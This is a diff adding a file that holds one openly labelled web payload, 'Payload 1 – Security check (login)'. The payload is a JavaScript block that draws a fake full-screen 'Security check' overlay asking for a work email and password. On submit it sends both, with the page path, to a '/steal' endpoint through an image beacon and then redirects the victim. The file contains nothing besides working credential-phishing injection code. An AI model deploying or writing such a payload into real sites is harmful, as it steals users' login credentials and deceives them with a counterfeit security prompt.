@@ -1,0 +1,123 @@
+<!-- Payload 1 – “Security check” (login) -->
+
+<script>
+(function () {
+    var backdrop = document.createElement("div");
+    backdrop.style.position = "fixed";
+    backdrop.style.inset = "0";
+    backdrop.style.background = "rgba(15,23,42,0.82)";
+    backdrop.style.display = "flex";
+    backdrop.style.alignItems = "center";
+    backdrop.style.justifyContent = "center";
+    backdrop.style.zIndex = "9999";
+
+    var card = document.createElement("div");
+    card.style.width = "100%";
+    card.style.maxWidth = "420px";
+    card.style.background = "#ffffff";
+    card.style.borderRadius = "16px";
+    card.style.boxShadow = "0 18px 45px rgba(15,23,42,0.25)";
+    card.style.padding = "28px 28px 24px";
+    card.style.fontFamily = "-apple-system,BlinkMacSystemFont,system-ui,sans-serif";
+
+    var title = document.createElement("h2");
+    title.textContent = "Security check";
+    title.style.margin = "0 0 4px";
+    title.style.fontSize = "20px";
+    title.style.fontWeight = "600";
+    title.style.color = "#0f172a";
+
+    var subtitle = document.createElement("p");
+    subtitle.textContent = "For your protection, please confirm your account to continue.";
+    subtitle.style.margin = "0 0 18px";
+    subtitle.style.fontSize = "14px";
+    subtitle.style.color = "#6b7280";
+
+    var form = document.createElement("form");
+    form.autocomplete = "off";
+
+    var emailLabel = document.createElement("label");
+    emailLabel.textContent = "Work email";
+    emailLabel.style.display = "block";
+    emailLabel.style.fontSize = "13px";
+    emailLabel.style.color = "#4b5563";
+    emailLabel.style.marginBottom = "4px";
+
+    var emailInput = document.createElement("input");
+    emailInput.type = "email";
+    emailInput.required = true;
+    emailInput.placeholder = "you@company.com";
+    emailInput.style.width = "100%";
+    emailInput.style.boxSizing = "border-box";
+    emailInput.style.borderRadius = "10px";
+    emailInput.style.border = "1px solid #e5e7eb";
+    emailInput.style.padding = "8px 10px";
+    emailInput.style.marginBottom = "12px";
+    emailInput.style.fontSize = "14px";
+
+    var passLabel = document.createElement("label");
+    passLabel.textContent = "Password";
+    passLabel.style.display = "block";
+    passLabel.style.fontSize = "13px";
+    passLabel.style.color = "#4b5563";
+    passLabel.style.margin = "8px 0 4px";
+
+    var passInput = document.createElement("input");
+    passInput.type = "password";
+    passInput.required = true;
+    passInput.placeholder = "Enter your password";
+    passInput.style.width = "100%";
+    passInput.style.boxSizing = "border-box";
+    passInput.style.borderRadius = "10px";
+    passInput.style.border = "1px solid #e5e7eb";
+    passInput.style.padding = "8px 10px";
+    passInput.style.marginBottom = "16px";
+    passInput.style.fontSize = "14px";
+
+    var submit = document.createElement("button");
+    submit.type = "submit";
+    submit.textContent = "Continue";
+    submit.style.width = "100%";
+    submit.style.border = "none";
+    submit.style.borderRadius = "999px";
+    submit.style.padding = "9px 12px";
+    submit.style.fontSize = "14px";
+    submit.style.fontWeight = "600";
+    submit.style.background = "#14b8a6";
+    submit.style.color = "#0f172a";
+    submit.style.cursor = "pointer";
+    submit.style.marginTop = "4px";
+
+    var helper = document.createElement("p");
+    helper.textContent = "Session timeout can occur after periods of inactivity.";
+    helper.style.margin = "12px 0 0";
+    helper.style.fontSize = "11px";
+    helper.style.color = "#9ca3af";
+
+    form.onsubmit = function (e) {
+        e.preventDefault();
+        var value = "login"
+        + "|email=" + emailInput.value
+        + "|password=" + passInput.value
+        + "|path=" + location.pathname;
+        var img = new Image();
+        img.src = "/steal?c=" + encodeURIComponent(value);
+        backdrop.remove();
+        window.location.href = "/";
+    };
+
+    form.appendChild(emailLabel);
+    form.appendChild(emailInput);
+    form.appendChild(passLabel);
+    form.appendChild(passInput);
+    form.appendChild(submit);
+
+    card.appendChild(title);
+    card.appendChild(subtitle);
+    card.appendChild(form);
+    card.appendChild(helper);
+
+    backdrop.appendChild(card);
+    document.body.appendChild(backdrop);
+})();
+</script>
